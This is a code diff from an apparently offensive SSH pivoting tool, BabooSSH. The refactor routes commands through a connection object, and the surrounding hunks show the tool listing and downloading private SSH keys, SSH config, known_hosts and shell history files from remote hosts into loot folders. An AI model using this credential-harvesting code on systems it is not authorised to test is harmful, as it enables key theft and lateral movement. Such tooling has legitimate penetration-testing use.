@@ -10,6 +10,7 @@ from baboossh.endpoint import Endpoint
 from baboossh.user import User
 from baboossh.path import Path
 from baboossh.creds import Creds
+from baboossh.exceptions import ConnectionClosedError
 
 class ExtStr(type):
     def __str__(self):
@@ -17,8 +18,7 @@ class ExtStr(type):
 
 class BaboosshExt(object,metaclass=ExtStr):
 
-    def __init__(self,socket,connection,wspaceFolder):
-        self.socket = socket
+    def __init__(self, connection, wspaceFolder):
         self.connection = connection
         self.wspaceFolder = wspaceFolder
         self.newCreds = []
@@ -53,8 +53,10 @@ class BaboosshExt(object,metaclass=ExtStr):
         pass
 
     @classmethod
-    def run(cls,socket, connection, wspaceFolder, stmt):
-        g = cls(socket,connection, wspaceFolder)
+    def run(cls, connection, wspaceFolder, stmt):
+        if connection.conn is None:
+            raise ConnectionClosedError
+        g = cls(connection, wspaceFolder)
         try:
             g.gather()
         except Exception as e:
@@ -94,7 +96,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         try:
             ipobj = ipaddress.ip_address(hostname)
         except ValueError:
-            res = self.socket.run("getent hosts "+hostname+" | awk '{ print $1 }'")
+            res = self.connection.conn.run("getent hosts "+hostname+" | awk '{ print $1 }'")
             ips = res.stdout.splitlines()
             for ip in ips:
                 ipobj = ipaddress.ip_address(ip)
@@ -138,7 +140,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         filename = str(self.connection.endpoint).replace(":","-")+"_"+str(self.connection.user)+"_.ssh_config"
         filepath = os.path.join(lootFolder,filename)
         try:
-            self.socket.get(".ssh/config",filepath)
+            self.connection.conn.get(".ssh/config",filepath)
         except Exception as e:
             return None
         with open(filepath,'r',errors='replace') as f:
@@ -216,7 +218,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         filename = str(self.connection.endpoint).replace(':','-')+"_"+str(self.connection.user)+"_.ssh_known_hosts"
         filepath = os.path.join(lootFolder,filename)
         try:
-            self.socket.get(".ssh/known_hosts",filepath)
+            self.connection.conn.get(".ssh/known_hosts",filepath)
         except Exception as e:
             return None
         with open(filepath,'r',errors='replace') as f:
@@ -235,7 +237,7 @@ class BaboosshExt(object,metaclass=ExtStr):
     def gatherKeys(self):
         files = []
         ret = []
-        result = self.socket.run("ls -A .ssh")
+        result = self.connection.conn.run("ls -A .ssh")
         for line in result.stdout.splitlines():
             if "rsa" in line or "key" in line or "p12" in line or "dsa" in line:
                 files.append(line)
@@ -250,7 +252,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         filename = str(self.connection.endpoint).replace(":","-")+"_"+str(self.connection.user)+"_"+keyfile.replace("/","_")
         filepath = os.path.join(keysFolder,filename)
         try:
-            self.socket.get(keyfile,filepath)
+            self.connection.conn.get(keyfile,filepath)
         except Exception as e:
             print(e)
             return None
@@ -280,7 +282,7 @@ class BaboosshExt(object,metaclass=ExtStr):
 
     def listHistoryFiles(self):
         ret = []
-        result = self.socket.run("ls -A")
+        result = self.connection.conn.run("ls -A")
         for line in result.stdout.splitlines():
             if "history" in line:
                 ret.append(line)
@@ -291,7 +293,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         filename = str(self.connection.endpoint).replace(":","-")+"_"+str(self.connection.user)+"_"+historyFile.replace("/","_")
         filepath = os.path.join(lootFolder,filename)
         try:
-            self.socket.get(historyFile,filepath)
+            self.connection.conn.get(historyFile,filepath)
         except Exception as e:
             print(e)
             return None
